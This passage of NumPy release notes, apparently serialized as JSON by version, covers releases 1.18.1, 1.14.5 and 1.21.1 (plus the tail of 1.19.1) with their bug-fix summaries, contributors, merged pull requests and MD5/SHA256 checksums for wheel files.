numpy-1.19.1-cp37-cp37m-manylinux2010_i686.whl\n    fceff6d052e0729e0bc4725d415a0424  numpy-1.19.1-cp37-cp37m-manylinux2010_x86_64.whl\n    8a40347a7aa0a78ad652761b18646b94  numpy-1.19.1-cp37-cp37m-manylinux2014_aarch64.whl\n    6f83733af7f25219b1309ed6e2125b40  numpy-1.19.1-cp37-cp37m-win32.whl\n    5ffe9aaa1be9790546bf0805349d11de  numpy-1.19.1-cp37-cp37m-win_amd64.whl\n    9fc17dd30d41000be08a5e76bda7cd13  numpy-1.19.1-cp38-cp38-macosx_10_9_x86_64.whl\n    e164a68bb255e40835243843fd748786  numpy-1.19.1-cp38-cp38-manylinux1_i686.whl\n    831327c74d9d0c69adba8c626e09a842  numpy-1.19.1-cp38-cp38-manylinux1_x86_64.whl\n    8d5cfc3f45d07874d427e9d62dfe6b0d  numpy-1.19.1-cp38-cp38-manylinux2010_i686.whl\n    08a1030ceea2f30f51e6c39264aec2e3  numpy-1.19.1-cp38-cp38-manylinux2010_x86_64.whl\n    a4dab4ffba3b1b2600400f89ab065112  numpy-1.19.1-cp38-cp38-manylinux2014_aarch64.whl\n    3b7770f38ed195e24692d6581e4634a1  numpy-1.19.1-cp38-cp38-win32.whl\n    8ec6183c736b4eacec8de80c98261af1  numpy-1.19.1-cp38-cp38-win_amd64.whl\n    a15c1aec844788f6e55c1da12f6bfa86  numpy-1.19.1-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    bb6f87f7b2d15a2e2a983b972afbcde5  numpy-1.19.1.tar.gz\n    2ccca1881b2766040149629614d22a3f  numpy-1.19.1.zip\n\nSHA256\n------\n::\n\n    b1cca51512299841bf69add3b75361779962f9cee7d9ee3bb446d5982e925b69  numpy-1.19.1-cp36-cp36m-macosx_10_9_x86_64.whl\n    c9591886fc9cbe5532d5df85cb8e0cc3b44ba8ce4367bd4cf1b93dc19713da72  numpy-1.19.1-cp36-cp36m-manylinux1_i686.whl\n    cf1347450c0b7644ea142712619533553f02ef23f92f781312f6a3553d031fc7  numpy-1.19.1-cp36-cp36m-manylinux1_x86_64.whl\n    ed8a311493cf5480a2ebc597d1e177231984c818a86875126cfd004241a73c3e  numpy-1.19.1-cp36-cp36m-manylinux2010_i686.whl\n    3673c8b2b29077f1b7b3a848794f8e11f401ba0b71c49fbd26fb40b71788b132  numpy-1.19.1-cp36-cp36m-manylinux2010_x86_64.whl\n    56ef7f56470c24bb67fb43dae442e946a6ce172f97c69f8d067ff8550cf782ff  numpy-1.19.1-cp36-cp36m-manylinux2014_aarch64.whl\n    aaf42a04b472d12515debc621c31cf16c215e332242e7a9f56403d814c744624  numpy-1.19.1-cp36-cp36m-win32.whl\n    082f8d4dd69b6b688f64f509b91d482362124986d98dc7dc5f5e9f9b9c3bb983  numpy-1.19.1-cp36-cp36m-win_amd64.whl\n    e4f6d3c53911a9d103d8ec9518190e52a8b945bab021745af4939cfc7c0d4a9e  numpy-1.19.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    5b6885c12784a27e957294b60f97e8b5b4174c7504665333c5e94fbf41ae5d6a  numpy-1.19.1-cp37-cp37m-manylinux1_i686.whl\n    1bc0145999e8cb8aed9d4e65dd8b139adf1919e521177f198529687dbf613065  numpy-1.19.1-cp37-cp37m-manylinux1_x86_64.whl\n    5a936fd51049541d86ccdeef2833cc89a18e4d3808fe58a8abeb802665c5af93  numpy-1.19.1-cp37-cp37m-manylinux2010_i686.whl\n    ef71a1d4fd4858596ae80ad1ec76404ad29701f8ca7cdcebc50300178db14dfc  numpy-1.19.1-cp37-cp37m-manylinux2010_x86_64.whl\n    b9792b0ac0130b277536ab8944e7b754c69560dac0415dd4b2dbd16b902c8954  numpy-1.19.1-cp37-cp37m-manylinux2014_aarch64.whl\n    b12e639378c741add21fbffd16ba5ad25c0a1a17cf2b6fe4288feeb65144f35b  numpy-1.19.1-cp37-cp37m-win32.whl\n    8343bf67c72e09cfabfab55ad4a43ce3f6bf6e6ced7acf70f45ded9ebb425055  numpy-1.19.1-cp37-cp37m-win_amd64.whl\n    e45f8e981a0ab47103181773cc0a54e650b2aef8c7b6cd07405d0fa8d869444a  numpy-1.19.1-cp38-cp38-macosx_10_9_x86_64.whl\n    667c07063940e934287993366ad5f56766bc009017b4a0fe91dbd07960d0aba7  numpy-1.19.1-cp38-cp38-manylinux1_i686.whl\n    480fdd4dbda4dd6b638d3863da3be82873bba6d32d1fc12ea1b8486ac7b8d129  numpy-1.19.1-cp38-cp38-manylinux1_x86_64.whl\n    935c27ae2760c21cd7354402546f6be21d3d0c806fffe967f745d5f2de5005a7  numpy-1.19.1-cp38-cp38-manylinux2010_i686.whl\n    309cbcfaa103fc9a33ec16d2d62569d541b79f828c382556ff072442226d1968  numpy-1.19.1-cp38-cp38-manylinux2010_x86_64.whl\n    7ed448ff4eaffeb01094959b19cbaf998ecdee9ef9932381420d514e446601cd  numpy-1.19.1-cp38-cp38-manylinux2014_aarch64.whl\n    de8b4a9b56255797cbddb93281ed92acbc510fb7b15df3f01bd28f46ebc4edae  numpy-1.19.1-cp38-cp38-win32.whl\n    92feb989b47f83ebef246adabc7ff3b9a59ac30601c3f6819f8913458610bdcc  numpy-1.19.1-cp38-cp38-win_amd64.whl\n    e1b1dc0372f530f26a03578ac75d5e51b3868b9b76cd2facba4c9ee0eb252ab1  numpy-1.19.1-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    1396e6c3d20cbfc119195303b0272e749610b7042cc498be4134f013e9a3215c  numpy-1.19.1.tar.gz\n    b8456987b637232602ceb4d663cb34106f7eb780e247d51a260b84760fd8f491  numpy-1.19.1.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.18.1": "==========================\n\nThis release contains fixes for bugs reported against NumPy 1.18.0.  Two bugs\nin particular that caused widespread problems downstream were:\n\n- The cython random extension test was not using a temporary directory for\n  building, resulting in a permission violation. Fixed.\n\n- Numpy distutils was appending `-std=c99` to all C compiler runs, leading to\n  changed behavior and compile problems downstream. That flag is now only\n  applied when building numpy C code.\n\nThe Python versions supported in this release are 3.5-3.8. Downstream\ndevelopers should use Cython >= 0.29.14 for Python 3.8 support and OpenBLAS >=\n3.7 to avoid errors on the Skylake architecture.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Matti Picus\n* Maxwell Aladago\n* Pauli Virtanen\n* Ralf Gommers\n* Tyler Reddy\n* Warren Weckesser\n\nPull requests merged\n====================\n\nA total of 13 pull requests were merged for this release.\n\n* `15158 <https://github.com/numpy/numpy/pull/15158>`__: MAINT: Update pavement.py for towncrier.\n* `15159 <https://github.com/numpy/numpy/pull/15159>`__: DOC: add moved modules to 1.18 release note\n* `15161 <https://github.com/numpy/numpy/pull/15161>`__: MAINT, DOC: Minor backports and updates for 1.18.x\n* `15176 <https://github.com/numpy/numpy/pull/15176>`__: TST: Add assert_array_equal test for big integer arrays\n* `15184 <https://github.com/numpy/numpy/pull/15184>`__: BUG: use tmp dir and check version for cython test (#15170)\n* `15220 <https://github.com/numpy/numpy/pull/15220>`__: BUG: distutils: fix msvc+gfortran openblas handling corner case\n* `15221 <https://github.com/numpy/numpy/pull/15221>`__: BUG: remove -std=c99 for c++ compilation (#15194)\n* `15222 <https://github.com/numpy/numpy/pull/15222>`__: MAINT: unskip test on win32\n* `15223 <https://github.com/numpy/numpy/pull/15223>`__: TST: add BLAS ILP64 run in Travis & Azure\n* `15245 <https://github.com/numpy/numpy/pull/15245>`__: MAINT: only add --std=c99 where needed\n* `15246 <https://github.com/numpy/numpy/pull/15246>`__: BUG: lib: Fix handling of integer arrays by gradient.\n* `15247 <https://github.com/numpy/numpy/pull/15247>`__: MAINT: Do not use private Python function in testing\n* `15250 <https://github.com/numpy/numpy/pull/15250>`__: REL: Prepare for the NumPy 1.18.1 release.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    f41ef9a855aa0baeb900827e2f99ab7b  numpy-1.18.1-cp35-cp35m-macosx_10_6_intel.whl\n    5239118baa2f0db334e70aac6cf26927  numpy-1.18.1-cp35-cp35m-manylinux1_i686.whl\n    78d95d2f1814b517e7cc887e559c7cd4  numpy-1.18.1-cp35-cp35m-manylinux1_x86_64.whl\n    c58a268ad42c31883b5756ad20cebe87  numpy-1.18.1-cp35-cp35m-win32.whl\n    2ffc13917b6813a85b8e1032402ca5f5  numpy-1.18.1-cp35-cp35m-win_amd64.whl\n    c3ac9936c6b21fef95a2304505fdb594  numpy-1.18.1-cp36-cp36m-macosx_10_9_x86_64.whl\n    e0a26cc2d04a7f115489b9ccc9678d3f  numpy-1.18.1-cp36-cp36m-manylinux1_i686.whl\n    d79f59200a821f90acf73f97c5252902  numpy-1.18.1-cp36-cp36m-manylinux1_x86_64.whl\n    8ba2338c677f238a84264633e3b96d9d  numpy-1.18.1-cp36-cp36m-win32.whl\n    2a2ab91e19bd2703eaa1506b06036958  numpy-1.18.1-cp36-cp36m-win_amd64.whl\n    6cc9c5767ffc0de03685f928e4e97f0f  numpy-1.18.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    486a5ab59cbdfc2861be08701702e251  numpy-1.18.1-cp37-cp37m-manylinux1_i686.whl\n    08123450dfbb9f53c812caa65895afcb  numpy-1.18.1-cp37-cp37m-manylinux1_x86_64.whl\n    3e4e223ba7b784cd90f891e8867d0cf8  numpy-1.18.1-cp37-cp37m-win32.whl\n    4a51b085685511e95be3077a7360785f  numpy-1.18.1-cp37-cp37m-win_amd64.whl\n    d1f034f563252a57b9235bc9ea2c1aef  numpy-1.18.1-cp38-cp38-macosx_10_9_x86_64.whl\n    2252dcd00034da6f99c98584875dcb9d  numpy-1.18.1-cp38-cp38-manylinux1_i686.whl\n    6e93a3c8618e87aee2b0cd648b1730f0  numpy-1.18.1-cp38-cp38-manylinux1_x86_64.whl\n    10f1d9a6faf6a2fdb0693347cb2348b0  numpy-1.18.1-cp38-cp38-win32.whl\n    b9d0e0840e3e6e37f384a794d48c4ae8  numpy-1.18.1-cp38-cp38-win_amd64.whl\n    9ab88e85f5b1fc70506287317b58f71d  numpy-1.18.1.tar.gz\n    18787d6482681c85a66629a781fb84c3  numpy-1.18.1.zip\n\nSHA256\n------\n::\n\n    20b26aaa5b3da029942cdcce719b363dbe58696ad182aff0e5dcb1687ec946dc  numpy-1.18.1-cp35-cp35m-macosx_10_6_intel.whl\n    70a840a26f4e61defa7bdf811d7498a284ced303dfbc35acb7be12a39b2aa121  numpy-1.18.1-cp35-cp35m-manylinux1_i686.whl\n    17aa7a81fe7599a10f2b7d95856dc5cf84a4eefa45bc96123cbbc3ebc568994e  numpy-1.18.1-cp35-cp35m-manylinux1_x86_64.whl\n    f3d0a94ad151870978fb93538e95411c83899c9dc63e6fb65542f769568ecfa5  numpy-1.18.1-cp35-cp35m-win32.whl\n    1786a08236f2c92ae0e70423c45e1e62788ed33028f94ca99c4df03f5be6b3c6  numpy-1.18.1-cp35-cp35m-win_amd64.whl\n    ae0975f42ab1f28364dcda3dde3cf6c1ddab3e1d4b2909da0cb0191fa9ca0480  numpy-1.18.1-cp36-cp36m-macosx_10_9_x86_64.whl\n    cf7eb6b1025d3e169989416b1adcd676624c2dbed9e3bcb7137f51bfc8cc2572  numpy-1.18.1-cp36-cp36m-manylinux1_i686.whl\n    b765ed3930b92812aa698a455847141869ef755a87e099fddd4ccf9d81fffb57  numpy-1.18.1-cp36-cp36m-manylinux1_x86_64.whl\n    2d75908ab3ced4223ccba595b48e538afa5ecc37405923d1fea6906d7c3a50bc  numpy-1.18.1-cp36-cp36m-win32.whl\n    9acdf933c1fd263c513a2df3dceecea6f3ff4419d80bf238510976bf9bcb26cd  numpy-1.18.1-cp36-cp36m-win_amd64.whl\n    56bc8ded6fcd9adea90f65377438f9fea8c05fcf7c5ba766bef258d0da1554aa  numpy-1.18.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    e422c3152921cece8b6a2fb6b0b4d73b6579bd20ae075e7d15143e711f3ca2ca  numpy-1.18.1-cp37-cp37m-manylinux1_i686.whl\n    b3af02ecc999c8003e538e60c89a2b37646b39b688d4e44d7373e11c2debabec  numpy-1.18.1-cp37-cp37m-manylinux1_x86_64.whl\n    d92350c22b150c1cae7ebb0ee8b5670cc84848f6359cf6b5d8f86617098a9b73  numpy-1.18.1-cp37-cp37m-win32.whl\n    77c3bfe65d8560487052ad55c6998a04b654c2fbc36d546aef2b2e511e760971  numpy-1.18.1-cp37-cp37m-win_amd64.whl\n    c98c5ffd7d41611407a1103ae11c8b634ad6a43606eca3e2a5a269e5d6e8eb07  numpy-1.18.1-cp38-cp38-macosx_10_9_x86_64.whl\n    9537eecf179f566fd1c160a2e912ca0b8e02d773af0a7a1120ad4f7507cd0d26  numpy-1.18.1-cp38-cp38-manylinux1_i686.whl\n    e840f552a509e3380b0f0ec977e8124d0dc34dc0e68289ca28f4d7c1d0d79474  numpy-1.18.1-cp38-cp38-manylinux1_x86_64.whl\n    590355aeade1a2eaba17617c19edccb7db8d78760175256e3cf94590a1a964f3  numpy-1.18.1-cp38-cp38-win32.whl\n    39d2c685af15d3ce682c99ce5925cc66efc824652e10990d2462dfe9b8918c6a  numpy-1.18.1-cp38-cp38-win_amd64.whl\n    e37802868ba5f389bf4e3f4c40c16e1b031814f0585ac122637de219de6279cb  numpy-1.18.1.tar.gz\n    b6ff59cee96b454516e47e7721098e6ceebef435e3e21ac2d6c3b8b02628eb77  numpy-1.18.1.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA512\n\n==========================\n", "1.14.5": "==========================\n\nThis is a bugfix release for bugs reported following the 1.14.4 release. The\nmost significant fixes are:\n\n* fixes for compilation errors on alpine and NetBSD\n\nThe Python versions supported in this release are 2.7 and 3.4 - 3.6. The Python\n3.6 wheels available from PIP are built with Python 3.6.2 and should be\ncompatible with all previous versions of Python 3.6. The source releases were\ncythonized with Cython 0.28.2 and should work for the upcoming Python 3.7.\n\nContributors\n============\n\nA total of 1 person contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n\nPull requests merged\n====================\n\nA total of 2 pull requests were merged for this release.\n\n* `11274 <https://github.com/numpy/numpy/pull/11274>`__: BUG: Correct use of NPY_UNUSED.\n* `11294 <https://github.com/numpy/numpy/pull/11294>`__: BUG: Remove extra trailing parentheses.\n\n\nChecksums\n=========\n\nMD5\n- ---\n\n    429afa5c8720016214a79779f774d3a4  numpy-1.14.5-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    de8f5c6c0e46eedf8d92c1a7ba3fccf7  numpy-1.14.5-cp27-cp27m-manylinux1_i686.whl\n    6315999b5142d22ce7bd9e74b1b4e3ab  numpy-1.14.5-cp27-cp27m-manylinux1_x86_64.whl\n    397a64608b5809983ff07842ebe0d353  numpy-1.14.5-cp27-cp27mu-manylinux1_i686.whl\n    6759e2f4bd57727f1ab9d6c9611b3f9d  numpy-1.14.5-cp27-cp27mu-manylinux1_x86_64.whl\n    2d5609f384fccf9fe4e6172dd4fed3d0  numpy-1.14.5-cp27-none-win32.whl\n    c0d5fc38ab45f19cbd12200ff4ea45dd  numpy-1.14.5-cp27-none-win_amd64.whl\n    0a77f36af749e5c3546c3d310f571256  numpy-1.14.5-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ae15c8254a4a3ebfc45894617ce030a2  numpy-1.14.5-cp34-cp34m-manylinux1_i686.whl\n    78c67b4b4f8f3f8bd9c2f897f9d40f60  numpy-1.14.5-cp34-cp34m-manylinux1_x86_64.whl\n    5263ec59028d508992c15263993698d0  numpy-1.14.5-cp34-none-win32.whl\n    193365c9f1bb2086b47afe9c797ff415  numpy-1.14.5-cp34-none-win_amd64.whl\n    90caeba061eec5dbebadad5c8bad3a0c  numpy-1.14.5-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    129848206c41b68071fe9cb469a66846  numpy-1.14.5-cp35-cp35m-manylinux1_i686.whl\n    395c0058b7ec0ae0cad1e052362e9aeb  numpy-1.14.5-cp35-cp35m-manylinux1_x86_64.whl\n    a542ea0d9047df0da8ab69e90d60dbdc  numpy-1.14.5-cp35-none-win32.whl\n    c5c86e11b5071c0ca0bb11f6a84f20e6  numpy-1.14.5-cp35-none-win_amd64.whl\n    350120bd20a0a45857b4c39e901af41b  numpy-1.14.5-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    5a0682a984fcf6f87a9f10760d896b70  numpy-1.14.5-cp36-cp36m-manylinux1_i686.whl\n    c5596c3d232345d0f0176cd02e6efe92  numpy-1.14.5-cp36-cp36m-manylinux1_x86_64.whl\n    c0306cbad68f8084e977121ba104b634  numpy-1.14.5-cp36-none-win32.whl\n    01b5bd7897e1306660c7ea6a30391cc4  numpy-1.14.5-cp36-none-win_amd64.whl\n    e3189ee851c3a0e2e6e4c6e80a711ec8  numpy-1.14.5.tar.gz\n    02d940a6931703de2c41fa5590ac7e98  numpy-1.14.5.zip\n\nSHA256\n- ------\n\n    e1864a4e9f93ddb2dc6b62ccc2ec1f8250ff4ac0d3d7a15c8985dd4e1fbd6418  numpy-1.14.5-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    085afac75bbc97a096744fcfc97a4b321c5a87220286811e85089ae04885acdd  numpy-1.14.5-cp27-cp27m-manylinux1_i686.whl\n    6c57f973218b776195d0356e556ec932698f3a563e2f640cfca7020086383f50  numpy-1.14.5-cp27-cp27m-manylinux1_x86_64.whl\n    589336ba5199c8061239cf446ee2f2f1fcc0c68e8531ee1382b6fc0c66b2d388  numpy-1.14.5-cp27-cp27mu-manylinux1_i686.whl\n    5edf1acc827ed139086af95ce4449b7b664f57a8c29eb755411a634be280d9f2  numpy-1.14.5-cp27-cp27mu-manylinux1_x86_64.whl\n    6b82b81c6b3b70ed40bc6d0b71222ebfcd6b6c04a6e7945a936e514b9113d5a3  numpy-1.14.5-cp27-none-win32.whl\n    385f1ce46e08676505b692bfde918c1e0b350963a15ef52d77691c2cf0f5dbf6  numpy-1.14.5-cp27-none-win_amd64.whl\n    758d1091a501fd2d75034e55e7e98bfd1370dc089160845c242db1c760d944d9  numpy-1.14.5-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    c725d11990a9243e6ceffe0ab25a07c46c1cc2c5dc55e305717b5afe856c9608  numpy-1.14.5-cp34-cp34m-manylinux1_i686.whl\n    07379fe0b450f6fd6e5934a9bc015025bb4ce1c8fbed3ca8bef29328b1bc9570  numpy-1.14.5-cp34-cp34m-manylinux1_x86_64.whl\n    9e1f53afae865cc32459ad211493cf9e2a3651a7295b7a38654ef3d123808996  numpy-1.14.5-cp34-none-win32.whl\n    4d278c2261be6423c5e63d8f0ceb1b0c6db3ff83f2906f4b860db6ae99ca1bb5  numpy-1.14.5-cp34-none-win_amd64.whl\n    d696a8c87315a83983fc59dd27efe034292b9e8ad667aeae51a68b4be14690d9  numpy-1.14.5-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    2df854df882d322d5c23087a4959e145b953dfff2abe1774fec4f639ac2f3160  numpy-1.14.5-cp35-cp35m-manylinux1_i686.whl\n    baadc5f770917ada556afb7651a68176559f4dca5f4b2d0947cd15b9fb84fb51  numpy-1.14.5-cp35-cp35m-manylinux1_x86_64.whl\n    2d6481c6bdab1c75affc0fc71eb1bd4b3ecef620d06f2f60c3f00521d54be04f  numpy-1.14.5-cp35-none-win32.whl\n    51c5dcb51cf88b34b7d04c15f600b07c6ccbb73a089a38af2ab83c02862318da  numpy-1.14.5-cp35-none-win_amd64.whl\n    8b8dcfcd630f1981f0f1e3846fae883376762a0c1b472baa35b145b911683b7b  numpy-1.14.5-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    9d69967673ab7b028c2df09cae05ba56bf4e39e3cb04ebe452b6035c3b49848e  numpy-1.14.5-cp36-cp36m-manylinux1_i686.whl\n    8622db292b766719810e0cb0f62ef6141e15fe32b04e4eb2959888319e59336b  numpy-1.14.5-cp36-cp36m-manylinux1_x86_64.whl\n    97fa8f1dceffab782069b291e38c4c2227f255cdac5f1e3346666931df87373e  numpy-1.14.5-cp36-none-win32.whl\n    381ad13c30cd1d0b2f3da8a0c1a4aa697487e8bb0e9e0cbeb7439776bcb645f8  numpy-1.14.5-cp36-none-win_amd64.whl\n    1b4a02758fb68a65ea986d808867f1d6383219c234aef553a8741818e795b529  numpy-1.14.5.tar.gz\n    a4a433b3a264dbc9aa9c7c241e87c0358a503ea6394f8737df1683c7c9a102ac  numpy-1.14.5.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCgAdFiEEqyfdqFB7QrgUmC/5czA7K8SQ/3AFAlsgT2IACgkQczA7K8SQ\n/3CT7AgAmIfuQRSB5qGA15BLbXdYYPtWAZRyzF8Ikkz+1P2y0BQVrAzJ05F4u01b\nXuU17O59W7Fs67tRxXNQ3SK17MN5UN/XfSY3tQdml9++RyJ87Tr0VTPEbvXwT5dZ\nXO1Pu+v9XMVOf7Eov+1qxnYAMYBxbZibPSZhfdDVyDIu7mLayTnfyAW1+hRbbOjv\nMb8Fb8xZVGhT6fq9i9ZfW/U4eTL/cWGStoSz2QIOqz0iT7iHvN6o1A21LuxrcdgK\nP3ApaYRj6UdZp1uRNmL+KdxLi6/0Jen4FB2hgV+kn2abjdipCadnsQ78Yb0InQD1\nZ09GqO6arVu0I0jPFBM28wIlv4P3kw==\n=k/XR\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.21.1": "==========================\nThe NumPy 1.21.1 is maintenance release that fixes bugs discovered after the\n1.21.0 release and updates OpenBLAS to v0.3.17 to deal with problems on arm64.\n\nThe Python versions supported for this release are 3.7-3.9. The 1.21.x series\nis compatible with development Python 3.10. Python 3.10 will be officially\nsupported after it is released.\n\n.. warning::\n   There are unresolved problems compiling NumPy 1.20.0 with gcc-11.1.\n\n   * Optimization level `-O3` results in many incorrect warnings when\n     running the tests.\n   * On some hardware NumPY will hang in an infinite loop.\n\nContributors\n============\n\nA total of 11 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Charles Harris\n* Ganesh Kathiresan\n* Gregory R. Lee\n* Hugo Defois +\n* Kevin Sheppard\n* Matti Picus\n* Ralf Gommers\n* Sayed Adel\n* Sebastian Berg\n* Thomas J. Fan\n\nPull requests merged\n====================\n\nA total of 26 pull requests were merged for this release.\n\n* `19311 <https://github.com/numpy/numpy/pull/19311>`__: REV,BUG: Replace ``NotImplemented`` with ``typing.Any``\n* `19324 <https://github.com/numpy/numpy/pull/19324>`__: MAINT: Fixed the return-dtype of ``ndarray.real`` and ``imag``\n* `19330 <https://github.com/numpy/numpy/pull/19330>`__: MAINT: Replace ``\"dtype[Any]\"`` with ``dtype`` in the definiton of...\n* `19342 <https://github.com/numpy/numpy/pull/19342>`__: DOC: Fix some docstrings that crash pdf generation.\n* `19343 <https://github.com/numpy/numpy/pull/19343>`__: MAINT: bump scipy-mathjax\n* `19347 <https://github.com/numpy/numpy/pull/19347>`__: BUG: Fix arr.flat.index for large arrays and big-endian machines\n* `19348 <https://github.com/numpy/numpy/pull/19348>`__: ENH: add ``numpy.f2py.get_include`` function\n* `19349 <https://github.com/numpy/numpy/pull/19349>`__: BUG: Fix reference count leak in ufunc dtype handling\n* `19350 <https://github.com/numpy/numpy/pull/19350>`__: MAINT: Annotate missing attributes of ``np.number`` subclasses\n* `19351 <https://github.com/numpy/numpy/pull/19351>`__: BUG: Fix cast safety and comparisons for zero sized voids\n* `19352 <https://github.com/numpy/numpy/pull/19352>`__: BUG: Correct Cython declaration in random\n* `19353 <https://github.com/numpy/numpy/pull/19353>`__: BUG: protect against accessing base attribute of a NULL subarray\n* `19365 <https://github.com/numpy/numpy/pull/19365>`__: BUG, SIMD: Fix detecting AVX512 features on Darwin\n* `19366 <https://github.com/numpy/numpy/pull/19366>`__: MAINT: remove ``print()``'s in distutils template handling\n* `19390 <https://github.com/numpy/numpy/pull/19390>`__: ENH: SIMD architectures to show_config\n* `19391 <https://github.com/numpy/numpy/pull/19391>`__: BUG: Do not raise deprecation warning for all nans in unique...\n* `19392 <https://github.com/numpy/numpy/pull/19392>`__: BUG: Fix NULL special case in object-to-any cast code\n* `19430 <https://github.com/numpy/numpy/pull/19430>`__: MAINT: Use arm64-graviton2 for testing on travis\n* `19495 <https://github.com/numpy/numpy/pull/19495>`__: BUILD: update OpenBLAS to v0.3.17\n* `19496 <https://github.com/numpy/numpy/pull/19496>`__: MAINT: Avoid unicode characters in division SIMD code comments\n* `19499 <https://github.com/numpy/numpy/pull/19499>`__: BUG, SIMD: Fix infinite loop during count non-zero on GCC-11\n* `19500 <https://github.com/numpy/numpy/pull/19500>`__: BUG: fix a numpy.npiter leak in npyiter_multi_index_set\n* `19501 <https://github.com/numpy/numpy/pull/19501>`__: TST: Fix a ``GenericAlias`` test failure for python 3.9.0\n* `19502 <https://github.com/numpy/numpy/pull/19502>`__: MAINT: Start testing with Python 3.10.0b3.\n* `19503 <https://github.com/numpy/numpy/pull/19503>`__: MAINT: Add missing dtype overloads for object- and ctypes-based...\n* `19510 <https://github.com/numpy/numpy/pull/19510>`__: REL: Prepare for NumPy 1.21.1 release.\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    d88af78c155cb92ce5535724ed13ed73  numpy-1.21.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    946e54ec9d174ec90db8ae07a4c4ae2f  numpy-1.21.1-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    84d7f8534fa3ce1a8c2e2eab18e514de  numpy-1.21.1-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    2e256d7862047967f2a7dbff8b8e9d6c  numpy-1.21.1-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4887ff09cc0652f3f1d9e0f40d1add63  numpy-1.21.1-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    bbe00679ce0ae484bb46776f64e00e32  numpy-1.21.1-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    b8eff5ba6bb920f3e65409abcfe7a55e  numpy-1.21.1-cp37-cp37m-win32.whl\n    d6ab781ad4537a818663a37392bdf647  numpy-1.21.1-cp37-cp37m-win_amd64.whl\n    f974f7a90567e082b16817e1218eb059  numpy-1.21.1-cp38-cp38-macosx_10_9_universal2.whl\n    37fb814042195516db4c5eedc23f65ef  numpy-1.21.1-cp38-cp38-macosx_10_9_x86_64.whl\n    2840e0ed51c8ebfb6fded7f1acfed810  numpy-1.21.1-cp38-cp38-macosx_11_0_arm64.whl\n    d87ed548450f324a3a6a3a230991e90a  numpy-1.21.1-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    e5e0e271fb18986887920f24b9ad8ec3  numpy-1.21.1-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    f060727f195388df3f3c1e2c43a8d247  numpy-1.21.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    26b0cc05d6f59241f401c16a6fe9300e  numpy-1.21.1-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    dac4489fdaeffd24d402a555e61b4087  numpy-1.21.1-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    c248a8f07bb458660274eab769dcc1e2  numpy-1.21.1-cp38-cp38-win32.whl\n    52386872b66b108de80b5447d0e3f6b1  numpy-1.21.1-cp38-cp38-win_amd64.whl\n    1a730aa7303421f31c2bca5a343010bb  numpy-1.21.1-cp39-cp39-macosx_10_9_universal2.whl\n    141701393752d472456d4a15f9a554e4  numpy-1.21.1-cp39-cp39-macosx_10_9_x86_64.whl\n    33a9c001675f708aebc06f0a653378c1  numpy-1.21.1-cp39-cp39-macosx_11_0_arm64.whl\n    6b9482c5090f532285313ad2cf48d319  numpy-1.21.1-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    94fa7591ad4e51a85cb17bcec170b986  numpy-1.21.1-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    f580b2ce2fb9cead163bab3f1d88fba7  numpy-1.21.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    238930d877b5d8a012b5b1bbc994ebb1  numpy-1.21.1-cp39-cp39-win32.whl\n    4014c63ac2a1c3e1df95f76feb14816e  numpy-1.21.1-cp39-cp39-win_amd64.whl\n    7cff22c1a04fdee710d38bd9468edbf1  numpy-1.21.1-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    033726e7ec59eea6b23307dcec35a37b  numpy-1.21.1.tar.gz\n    1d016e05851a4ba85307f3246eb569aa  numpy-1.21.1.zip\n\nSHA256\n------\n::\n\n    38e8648f9449a549a7dfe8d8755a5979b45b3538520d1e735637ef28e8c2dc50  numpy-1.21.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    